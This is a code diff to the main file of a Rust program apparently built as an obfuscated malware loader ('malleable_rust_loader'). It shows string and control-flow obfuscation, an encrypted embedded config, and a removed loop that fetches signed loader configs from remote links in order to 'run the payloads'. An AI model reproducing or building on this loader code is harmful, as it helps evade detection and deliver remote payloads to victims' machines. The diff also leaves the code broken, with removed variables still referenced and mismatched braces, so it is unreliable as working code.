@@ -1,5 +1,5 @@
 use malleable_rust_loader::link::LinkFetch;
-use malleable_rust_loader::config::Config;
+use malleable_rust_loader::loaderconf::Config;
 use std::{thread, time};
 
 #[macro_use]
@@ -32,8 +32,9 @@ const INITIAL_LOADER : &[u8] = include_bytes!("/projects/config/initial.json.aea
 #[cfg(feature="ollvm")]
 const INITIAL_LOADER_DATAOPE: &[u8] = include_bytes!("/projects/config/initial.json.aead.dataop.rot13b64");
 
+
 fn main() {
-    #[cfg(feature = "logdebug")]
+    #[cfg(feature="logdebug")]
     env_logger::init();
 
     cryptify::flow_stmt!();
@@ -56,6 +57,8 @@ fn main() {
     loaderconf.verify_newloader_sign(&loaderconf).unwrap();
     info!("{}{}", lc!("[+] VERIFIED!"), "\n");
 
+
+
     let mut loop_nb = 1;
     loop {
         info!(
@@ -72,74 +75,8 @@ fn main() {
         if loaderconf.stop_defuse(&loaderconf.defuse_update) {
             error!("{}", lc!("[!] DEFUSE STOP reload config"));
         } else {
-            let mut nb_config = 0;
-            let mut change_loader = false;
-            let mut replacement_loaderconf: Config = Config::new_empty();
-            info!("{}", lc!("[+] RELOAD config"));
 
-            for conflink in &loaderconf.loaderconf_update_links {
-                nb_config = nb_config + 1;
-                info!(
-                    "{}/{}{}{:?}",
-                    nb_config,
-                    &loaderconf.loaderconf_update_links.len(),
-                    lc!(" config link: "),
-                    &conflink
-                );
-                let result = conflink.fetch_data();
-                let data = match result {
-                    Ok(data) => data,
-                    Err(error) => {
-                        warn!("{}{}", lc!("error: "), error);
-                        continue;
-                    }
-                };
-                debug!("{}", lc!("deserialized data"));
-                let newloader: Config = match serde_json::from_slice(&data) {
-                    Ok(newloader) => newloader,
-                    Err(error) => {
-                        warn!("{}{}", lc!("error: "), error);
-                        continue;
-                    }
-                };
-                debug!("{}", lc!("new loader downloaded:"));
-                newloader.print_loader_compact();
-                let verified = match loaderconf.verify_newloader_sign(&newloader) {
-                    Ok(()) => true,
-                    _unspecified => false,
-                };
-                if verified {
-                    info!("{}{}", lc!("verify signature: "), verified);
-                } else {
-                    warn!("{}{}", lc!("verify signature: "), verified);
-                }
-                if verified {
-                    let is_same_loader = loaderconf.is_same_loader(&newloader);
-                    if is_same_loader {
-                        info!("{}{}", lc!("same loader: "), is_same_loader);
-                    } else {
-                        warn!("{}{}", lc!("same loader: "), is_same_loader);
-                    }
-                    if is_same_loader {
-                        info!(
-                            "{}",
-                            lc!("[+] DECISION: keep the same active LOADER, and run the payloads")
-                        );
-                        break;
-                    } else {
-                        info!(
-                        "{}",
-                        lc!("[+] DECISION: replace the active LOADER by this one, and run the payloads")
-                    );
-                        change_loader = true;
-                        replacement_loaderconf = newloader;
-                        break;
-                    }
-                }
-                info!(
-                    "{}",
-                    lc!("[+] DECISION: try to fetch an other loader with next link")
-                );
+            
             }
 
             if change_loader {
